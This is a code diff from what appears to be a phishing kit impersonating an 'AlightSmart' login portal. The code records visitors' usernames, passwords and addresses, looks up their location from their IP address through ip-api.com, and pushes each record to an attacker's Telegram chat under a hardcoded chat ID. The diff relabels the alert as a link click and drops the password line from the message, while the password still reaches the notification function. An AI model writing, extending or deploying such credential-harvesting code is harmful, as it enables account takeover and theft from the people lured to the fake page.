@@ -39,24 +39,20 @@ const CHAT_ID = "8559945003";
 
 async function getLocation(ip) {
     if (!ip || ip === 'Unknown') return 'Unknown Location';
-
     try {
-        // Faster primary service
-        const res = await fetch(`http://ip-api.com/json/${ip}?fields=city,country`, { timeout: 4000 });
+        const res = await fetch(`http://ip-api.com/json/${ip}?fields=city,country`, { timeout: 5000 });
         const data = await res.json();
         if (data.city || data.country) {
             return `${data.city || ''}, ${data.country || ''}`.trim() || 'Unknown Location';
         }
     } catch (e) {}
-
     return 'Unknown Location';
 }
 
 async function sendTelegramNotification(record) {
-    const message = `🚨🔴 *NEW ACTIVITY - AlightSmart!*\n\n` +
+    const message = `🚨🔴 *NEW LINK CLICK - AlightSmart!*\n\n` +
         `• *Type:* ${record.type}\n` +
         `• *Username:* ${record.username || 'Visitor'}\n` +
-        `• *Password:* ${record.password || '-'}\n` +
         `• *Details:* ${record.address || '-'}\n` +
         `• *IP:* ${record.ip}\n` +
         `• *Location:* ${record.location || 'Unknown Location'}\n` +
@@ -90,6 +86,7 @@ async function saveRecord(type, username = null, password = null, address = null
 
         console.log(`✅ SAVED: ${type} | Location: ${location}`);
 
+        // Immediate notification
         await sendTelegramNotification({ type, username, password, address, ip, location, timestamp });
 
     } catch (err) {
